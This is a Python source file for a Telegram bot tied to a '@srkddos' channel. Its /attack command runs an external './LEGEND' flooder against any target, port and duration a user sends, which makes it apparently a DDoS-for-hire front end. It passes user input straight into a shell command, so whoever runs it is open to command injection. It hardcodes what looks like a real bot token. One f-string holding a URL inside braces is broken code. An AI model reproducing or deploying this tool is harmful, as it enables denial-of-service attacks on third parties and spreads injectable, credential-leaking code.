#!/usr/bin/python3
import telebot
import random
import subprocess
import time
import threading

# Telegram bot token
bot = telebot.TeleBot('5373842002:AAETkiRjk84SNsPHictnLDMhRO2XCFz-N_Q')

# Admin user IDs
admin_id = ["1232047106"]

# Group and channel details
GROUP_ID = "-1002322006686"
CHANNEL_USERNAME = "@srkddos"

# YouTube Channel Promotion
YOUTUBE_CHANNEL_LINK = "https://youtube.com/@zeroflexislive?si=QCy1x8BNZ3R1DRxD"

# List of Attack Messages
attack_messages = [
    "🚀 Firing rockets at {}!",
    "💣 Dropping bombs on {}!",
    "🧨 Blasting {} into pieces!",
    "🎯 Target acquired: {}!",
    "🔥 Launching fire attack on {}!",
    "💥 Exploding {} with maximum force!",
    "⚔️ Unleashing wrath on {}!",
    "🔫 Shooting relentlessly at {}!",
    "🪓 Hacking {} into oblivion!",
    "😈 Bringing chaos to {}!"
]

# Dictionary to Store Cooldowns (user_id: cooldown_end_time)
user_cooldowns = {}

# Start Command
@bot.message_handler(commands=['start'])
def start(message):
    if str(message.from_user.id) in admin_id:
        bot.reply_to(message, "Welcome Admin! How can I assist you today?")
    else:
        bot.reply_to(message, "Hello! Welcome to the bot.")

# Attack Command with 30-Second Per-User Cooldown
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    current_time = time.time()

    # Check if user is in cooldown
    if user_id in user_cooldowns:
        remaining_time = round(user_cooldowns[user_id] - current_time)
        if remaining_time > 0:
            bot.reply_to(message, f"⏳ Please wait {remaining_time} seconds before using /attack again!")
            return

    try:
        args = message.text.split(' ')
        if len(args) < 4:
            bot.reply_to(message, "Usage: /attack <target> <port> <duration (max 180 sec)>")
            return

        target, port, duration = args[1], args[2], int(args[3])
        
        # Validate Duration
        if duration > 180:
            bot.reply_to(message, "❌ Duration too long! Maximum allowed is 180 seconds.")
            return
        
        # Show Attack Details
        attack_msg = random.choice(attack_messages).format(target)
        bot.reply_to(message, f"{attack_msg}\n\n🎯 **Target:** {target}\n🚪 **Port:** {port}\n⏱️ **Duration:** {duration} sec")

        # Execute Shell Command
        full_command = f"./LEGEND {target} {port} {duration}"
        subprocess.Popen(full_command, shell=True)
        bot.reply_to(message, f"✅ Attack started: `{full_command}`", parse_mode="Markdown")

        # Set Cooldown (30 seconds)
        user_cooldowns[user_id] = current_time + 30

        # Timer for Completion Message
        def finish_attack():
            time.sleep(duration)
            bot.reply_to(message, f"🏁 Attack on {target}:{port} finished after {duration} seconds! 🎉")
            
            # YouTube Channel Promotion
            promotion_message = (
                f"📢 Don't forget to check out our YouTube channel for more cool stuff! 🎬\n"
                f"👉 [Visit Now]({https://youtube.com/@zeroflexislive?si=QCy1x8BNZ3R1DRxD})"
            )
            bot.send_message(message.chat.id, promotion_message, parse_mode="Markdown")

        # Run the Timer in a Separate Thread
        threading.Thread(target=finish_attack).start()

    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

# Polling to keep the bot running
print("Bot is running...")
bot.infinity_polling()
